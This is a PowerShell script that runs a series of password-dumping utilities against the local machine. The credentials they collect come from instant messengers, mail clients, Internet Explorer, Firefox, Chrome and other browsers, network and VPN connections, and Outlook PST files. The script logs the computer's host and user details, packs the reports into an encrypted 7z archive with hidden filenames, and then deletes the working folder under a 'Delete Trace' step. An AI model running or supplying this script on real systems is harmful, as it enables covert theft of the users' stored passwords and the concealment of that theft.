# Define Variable for 7Zip4Powershell
$ZipName = $env:COMPUTERNAME + "-PWLOG.7z"
$OutputFile = $PSScriptRoot
$ReportPath = Join-Path $OutputFile "Report" #percorso completo nuova cartella creata
$zipPassword = Read-Host "Insert password for archivie" -MaskInput

# Check if the "Report" folder exists
if (Test-Path $reportPath -PathType Container) {
    # If the folder exists, ask the user what to do
    $choice = Read-Host "The 'Report' folder already exists. Do you want to delete it? (Y/N)"
    
    if ($choice -eq "Y") {
        # Delete the "Report" folder and its contents
        Remove-Item -Path $reportPath -Recurse
    } else {
        # Abort the script
        Write-Host "Operation canceled. The script will exit."
        Exit
    }
}

# Check if the final archivie already exist
$zipPath = Join-Path $OutputFile $ZipName
if (Test-Path $zipPath -PathType Leaf) {
    # Se il file esiste, chiedi all'utente cosa fare
    $choice = Read-Host "The ZIP file '$ZipName' already exists. Do you want to overwrite it? (Y/N)"
    
    if ($choice -eq "Y") {
        # Delete the 7z file
        Remove-Item -Path $zipPath
    } else {
        # Abort the script
        Write-Host "Operation canceled. The script will exit."
        Exit
    }
}

# Install Compression Module
Install-Module -Name 7Zip4Powershell -Scope CurrentUser -force

# obtain the script folder
if ($PSScriptRoot) {
    $scriptPath = $PSScriptRoot
} else {
    $scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Definition
}

# Generate Report
Start-Process -FilePath "mspass.exe" -ArgumentList "/sverhtml InstantMessengerPassReC.html" -Wait
Start-Process -FilePath "mailpv.exe" -ArgumentList "/sverhtml MailPassRec.html" -Wait
Start-Process -FilePath "iepv.exe" -ArgumentList "/sverhtml iexPassRec.html" -Wait
Start-Process -FilePath "passwordfox.exe" -ArgumentList "/sverhtml FirefoxPassRec.html" -Wait
Start-Process -FilePath "WebBrowserPassView.exe" -ArgumentList "/sverhtml OthBrowserPassRec.html" -Wait
Start-Process -FilePath "ChromePass.exe" -ArgumentList "/sverhtml ChromePassRec.html" -Wait
Start-Process -FilePath "netpass.exe" -ArgumentList "/sverhtml NetworkPassRec.html" -Wait
Start-Process -FilePath "dialupass.exe" -ArgumentList "/sverhtml DialRasVpnPassRec.html" -Wait
Start-Process -FilePath "PstPassword.exe" -ArgumentList "/sverhtml PstPassRec.html" -Wait

# Resume PC information in LOG
$pcInfo = @"
COMPUTERNAME = $env:COMPUTERNAME
USERNAME = $env:USERNAME
USERDOMAIN = $env:USERDOMAIN
USERPROFILE = $env:USERPROFILE

Data: $(Get-Date) - ORA: $(Get-Date -Format "HH:mm:ss")
"@

$pcInfo | Out-File -FilePath "log.txt" -Append

# Move Report into a new folder
New-Item -Path $reportPath -ItemType Directory
Move-Item -Path (Join-Path $scriptPath "*.html"), (Join-Path $scriptPath "*.txt") -Destination $reportPath

# Use 7Zip4Powershell for ZIP file with Password
#Compress-7zip -Path report.zip -ArchiveFileName $zipFile -OutputPath $OutputFile -Password $zipPassword
Compress-7Zip -ArchiveFileName $ZipName -Path $ReportPath -Format SevenZip -OutputPath $OutputFile -password $zipPassword -EncryptFilenames

# Delete Trace 
Remove-Item -Path $reportPath -Recurse

# Uninstall Compression Module
Remove-Module -Name 7Zip4Powershell